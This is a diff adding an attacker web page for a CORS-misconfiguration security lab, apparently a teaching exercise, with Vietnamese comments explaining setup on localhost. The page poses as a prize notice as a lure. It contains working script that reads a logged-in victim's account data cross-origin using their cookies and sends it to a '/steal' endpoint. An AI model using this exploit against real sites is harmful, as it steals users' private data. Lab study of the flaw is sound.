@@ -1,0 +1,36 @@
+<!doctype html>
+<!--
+  Trang web ac (attacker page) cho lab 9.3.
+  Dat trang nay tren mot origin khac (vi du http://127.0.0.1:8074) roi
+  du nan nhan - DANG dang nhap victim app - ghe tham. Vi victim app reflect
+  Origin + bat credentials, trinh duyet cua nan nhan se CHO PHEP doan JS ben
+  duoi DOC du lieu /api/account kem cookie cua nan nhan va gui ve cho attacker.
+
+  Cach chay that bang trinh duyet (tuy chon):
+    1. Chay victim:   python3 app.py            (cong 8073)
+    2. Serve trang:   python3 -m http.server 8074 --bind 127.0.0.1
+    3. Mo http://127.0.0.1:8073/login bang fetch de co cookie, hoac POST login.
+    4. Mo http://127.0.0.1:8074/attacker.html -> thay du lieu nan nhan hien ra.
+
+  File exploit.py chung minh dieu quan trong nhat (server reflect Origin +
+  credentials) ma khong can GUI trinh duyet.
+-->
+<html lang="vi">
+<head><meta charset="utf-8"><title>Trang khuyen mai</title></head>
+<body>
+<h1>Ban trung thuong! Doi chut...</h1>
+<pre id="out">dang tai...</pre>
+<script>
+const VICTIM = "http://127.0.0.1:8073";
+fetch(VICTIM + "/api/account", { credentials: "include" })
+  .then(r => r.json())
+  .then(data => {
+    document.getElementById("out").textContent =
+      "DOC DUOC DU LIEU NAN NHAN:\n" + JSON.stringify(data, null, 2);
+    // Trong thuc te: gui data ve server cua attacker.
+    fetch("/steal?d=" + encodeURIComponent(JSON.stringify(data)));
+  })
+  .catch(e => { document.getElementById("out").textContent = "loi: " + e; });
+</script>
+</body>
+</html>
